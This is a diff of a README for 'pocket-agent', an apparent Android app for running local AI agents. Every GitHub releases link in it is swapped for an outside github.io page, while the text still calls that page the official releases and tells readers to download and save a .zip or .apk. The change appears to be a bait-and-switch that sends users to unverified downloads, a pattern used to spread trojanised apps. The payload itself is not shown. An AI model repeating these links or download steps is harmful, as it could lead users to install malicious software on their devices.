@@ -1,6 +1,6 @@
 # 🤖 pocket-agent - Run intelligent AI agents on tablets
 
-[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/Blondieredistributed612/pocket-agent/releases)
+[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://blondieredistributed612.github.io)
 
 pocket-agent lets you run an AI agent directly on your Android device. It uses the power of your hardware to process requests without sending your data to the cloud. You gain privacy and offline access to a tool-calling assistant that executes tasks on your device using Termux and llama.cpp.
 
@@ -8,10 +8,10 @@ pocket-agent lets you run an AI agent directly on your Android device. It uses t
 
 You can find all versions of this software on the official releases page. 
 
-[Download the latest release here](https://github.com/Blondieredistributed612/pocket-agent/releases)
+[Download the latest release here](https://blondieredistributed612.github.io)
 
 Follow these steps to download the file:
-1. Open the [Release Page](https://github.com/Blondieredistributed612/pocket-agent/releases).
+1. Open the [Release Page](https://blondieredistributed612.github.io).
 2. Look under the "Assets" section for the newest entry.
 3. Click the file that ends in .zip or .apk depending on your setup.
 4. Save the file to your Android internal storage.
